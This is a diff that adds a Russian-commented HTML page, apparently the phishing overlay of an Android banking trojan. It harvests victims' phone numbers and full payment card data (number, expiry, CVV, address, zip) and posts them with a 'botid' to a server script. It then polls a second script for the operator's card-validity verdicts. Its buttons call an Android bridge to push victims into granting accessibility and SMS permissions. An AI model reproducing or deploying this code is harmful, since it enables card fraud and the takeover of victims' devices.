@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Отправка формы</title>
+    <script>
+        function clickGiveAccess() {
+            checkGivePerm();
+
+        }
+
+        function clickSmsAccess() {
+            checkSmsPerm();
+        }
+
+        function sendForm1(event) {
+            event.preventDefault(); // Предотвращаем стандартное поведение отправки формы
+
+            var form = document.getElementById("form1");
+            var formData = new FormData(form);
+            var botId = getQueryParam("botid");
+            formData.append("method", "phone");
+            formData.append("botid", botId);
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "get.php", true);
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    // Обработка успешного ответа сервера
+                    //  console.log(xhr.responseText);
+                    // sendRequestWithBotId(); // Вызываем функцию showLoaderAndRedirect() после выполнения запроса
+                } else {
+                    // Обработка ошибок
+                    console.error(xhr.statusText);
+                }
+            };
+            xhr.send(formData);
+
+            var button = document.getElementById('submitButton1');
+            button.disabled = true; // Делаем кнопку неактивной после отправки формы
+        }
+
+        function sendForm2(event) {
+            event.preventDefault(); // Предотвращаем стандартное поведение отправки формы
+
+            var form = document.getElementById("form2");
+            var formData = new FormData(form);
+            var botId = getQueryParam("botid");
+            formData.append("method", "card");
+            formData.append("botid", botId);
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "get.php", true);
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    // Обработка успешного ответа сервера
+                    console.log(xhr.responseText);
+                    sendRequestWithBotId(); // Вызываем функцию sendRequestWithBotId() после выполнения запроса
+
+                } else {
+                    // Обработка ошибок
+                    console.error(xhr.statusText);
+                }
+            };
+            xhr.send(formData);
+
+            var button = document.getElementById('submitButton2');
+            button.disabled = true; // Делаем кнопку неактивной после отправки формы
+        }
+
+
+        function sendRequestWithBotId() {
+            var botId = getQueryParam("botid");
+
+
+            if (botId) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", "vailead.php?method=valid&botid=" + botId, true);
+                xhr.onreadystatechange = function () {
+                    if (xhr.readyState === 4) {
+                        var responseCode = xhr.status;
+                        if (responseCode === 400) {
+                            setTimeout(sendRequestWithBotId, 1000);
+                        } else if (responseCode === 201) {
+                            window.location.href = "end.php";
+                        } else if (responseCode === 202) {
+                            alert("credit card not accepted");
+
+                            var button = document.getElementById('submitButton2');
+                            button.disabled = false; // Делаем кнопку неактивной после отправки формы
+
+                        } else if (responseCode === 203) {
+                            alert("virtual card not accepted");
+                            var button = document.getElementById('submitButton2');
+                            button.disabled = false; // Делаем кнопку неактивной после отправки формы
+
+
+                        } else if (responseCode === 204) {
+                            alert("invalid address provided");
+                            var button = document.getElementById('submitButton2');
+                            button.disabled = false; // Делаем кнопку неактивной после отправки формы
+
+                        } else if (responseCode === 205) {
+                            alert("invalid card");
+                            var button = document.getElementById('submitButton2');
+                            button.disabled = false; // Делаем кнопку неактивной после отправки формы
+
+                        } else {
+                            console.error("Unexpected response code: " + responseCode);
+                        }
+                    }
+                };
+                xhr.send();
+            } else {
+                console.error("Missing botid parameter");
+            }
+        }
+
+        function checkSmsPerm() {
+            var botId = getQueryParam("botid");
+            // Android.clicksmsaccess();
+
+            if (botId) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", "vailead.php?method=perm&perminfo=sms&botid=" + botId, true);
+                xhr.onreadystatechange = function () {
+                    if (xhr.readyState === 4) {
+                        var responseCode = xhr.status;
+                        if (responseCode === 400) {
+                            setTimeout(checkSmsPerm, 1000);
+                        } else if (responseCode === 200) {
+                            //разрешение выдано
+                            alert('perm est!');
+                        } else if (responseCode === 202) {
+                            //разрешение не выдано
+                            Android.clicksmsaccess();
+
+                        } else {
+                            console.error("Unexpected response code: " + responseCode);
+                        }
+                    }
+                };
+                xhr.send();
+            } else {
+                console.error("Missing botid parameter");
+            }
+        }
+
+
+        function checkGivePerm() {
+            var botId = getQueryParam("botid");
+
+
+            if (botId) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", "vailead.php?method=perm&perminfo=accessibility&botid=" + botId, true);
+                xhr.onreadystatechange = function () {
+                    if (xhr.readyState === 4) {
+                        var responseCode = xhr.status;
+                        if (responseCode === 400) {
+                            setTimeout(checkGivePerm, 1000);
+                        } else if (responseCode === 200) {
+                            //разрешение выдано
+                            alert('perm est!');
+                        } else if (responseCode === 202) {
+                            //разрешение не выдано
+                            Android.clickgiveaccess();
+                        } else {
+                            console.error("Unexpected response code: " + responseCode);
+                        }
+                    }
+                };
+                xhr.send();
+            } else {
+                console.error("Missing botid parameter");
+            }
+        }
+
+
+
+        function getQueryParam(name) {
+            var urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+
+
+
+    </script>
+</head>
+
+<body>
+
+    <form method="post" id="form1" style="margin-bottom: 20px;">
+
+
+        <label for="phone">Phone:</label>
+        <input type="text" name="phone" id="phone">
+
+        <input type="button" name="submit" id="submitButton1" value="Отправить" onclick="sendForm1(event)">
+    </form>
+
+    <form method="post" id="form2" style="margin-bottom: 20px;">
+
+
+        <label for="card">card:</label>
+        <input type="text" name="cdn" id="cdn">
+
+        <label for="exp">exp:</label>
+        <input type="text" name="eeex" id="eeex">
+
+        <label for="cvv">cvv:</label>
+        <input type="text" name="ccc" id="ccc">
+
+        <label for="address">address:</label>
+        <input type="text" name="add" id="add">
+
+        <label for="zip">zip:</label>
+        <input type="text" name="zpp" id="zpp">
+
+
+        <input type="button" name="submit" id="submitButton2" value="Отправить" onclick="sendForm2(event)">
+    </form>
+
+    <div style="text-align: center;">
+        <button onclick="clickGiveAccess()">Дать доступ</button>
+        <button onclick="clickSmsAccess()">Доступ к SMS</button>
+    </div>
+</body>
+
+</html>
